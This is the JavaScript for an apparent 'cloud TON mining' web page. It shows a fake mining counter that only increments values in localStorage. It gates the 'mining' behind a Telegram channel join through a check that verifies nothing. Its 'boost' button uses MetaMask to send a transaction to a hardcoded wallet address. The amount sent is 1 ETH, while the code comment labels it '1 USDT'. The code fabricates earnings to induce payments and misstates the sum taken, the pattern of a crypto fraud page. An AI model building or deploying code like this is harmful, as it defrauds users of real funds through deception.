let tonValue = 0.000000001;
let balance = 0;

// Load saved values from localStorage
if (localStorage.getItem('tonValue')) {
    tonValue = parseFloat(localStorage.getItem('tonValue'));
}

if (localStorage.getItem('balance')) {
    balance = parseFloat(localStorage.getItem('balance'));
}

const tonValueElement = document.getElementById('ton-value');
const balanceElement = document.getElementById('balance');
const rotatingImage = document.getElementById('rotating-image');
const startButton = document.getElementById('start-button');
const joinTelegramButton = document.getElementById('joinTelegramButton');

function updateTonValue() {
    tonValue += 0.000000096;
    tonValueElement.textContent = `${tonValue.toFixed(9)} TON`;
    localStorage.setItem('tonValue', tonValue);
}

document.getElementById('claim-button').addEventListener('click', () => {
    balance += tonValue;
    balanceElement.textContent = balance.toFixed(9);
    localStorage.setItem('balance', balance);
    tonValue = 0.000000000;
    localStorage.setItem('tonValue', tonValue);
    tonValueElement.textContent = `${tonValue.toFixed(9)} TON`;
});

document.getElementById('boost-button').addEventListener('click', () => {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('boost-screen').style.display = 'block';
});

document.getElementById('back-button').addEventListener('click', () => {
    document.getElementById('boost-screen').style.display = 'none';
    document.getElementById('main-screen').style.display = 'block';
});

balanceElement.textContent = balance.toFixed(9);
tonValueElement.textContent = `${tonValue.toFixed(9)} TON`;

function checkTelegramMembership() {
    fetch('https://script.google.com/macros/s/AKfycbxsdKgWwg8FVEOy3xjjQ6mIIQMuGd0PF_kA_Oz7xGS_8YL_DOcfbBsARc7HN5m4yAasQQ/exec')
        .then(response => response.json())
        .then(data => {
            if (data.isMember) {
                startButton.disabled = false;
                startButton.addEventListener('click', startMining);
            } else {
                startButton.disabled = true;
                startButton.addEventListener('click', () => {
                    alert('Please join Telegram channel first.');
                });
            }
        })
        .catch(error => console.error('Error:', error));
}

function startMining() {
    rotatingImage.classList.add('rotating');
    setInterval(updateTonValue, 1000);
}

checkTelegramMembership();

joinTelegramButton.addEventListener('click', function() {
    window.open('https://t.me/Cloudtonmining', '_blank');
});

// Wallet Integration
const connectButton = document.getElementById('connect-button');
const payButton = document.getElementById('pay-button');
let walletConnected = false;

connectButton.addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            walletConnected = true;
            alert(`Wallet connected: ${account}`);
        } catch (error) {
            console.error(error);
            alert('Failed to connect wallet.');
        }
    } else {
        alert('MetaMask is not installed.');
    }
});

payButton.addEventListener('click', async () => {
    if (!walletConnected) {
        alert('Please connect your wallet first.');
        return;
    }

    try {
        const transactionParameters = {
            to: '0xf304EFAE3eDCD3F7166b28981D1F9C3108a201A8',
            from: ethereum.selectedAddress,
            value: '0xDE0B6B3A7640000', // 1 USDT in wei (1 * 10^18)
            gasPrice: '0x09184e72a000', // customizable by user during MetaMask confirmation
            gas: '0x2710', // customizable by user during MetaMask confirmation
        };

        const txHash = await ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
        });

        alert(`Transaction sent: ${txHash}`);
    } catch (error) {
        console.error(error);
        alert('Transaction failed.');
    }
});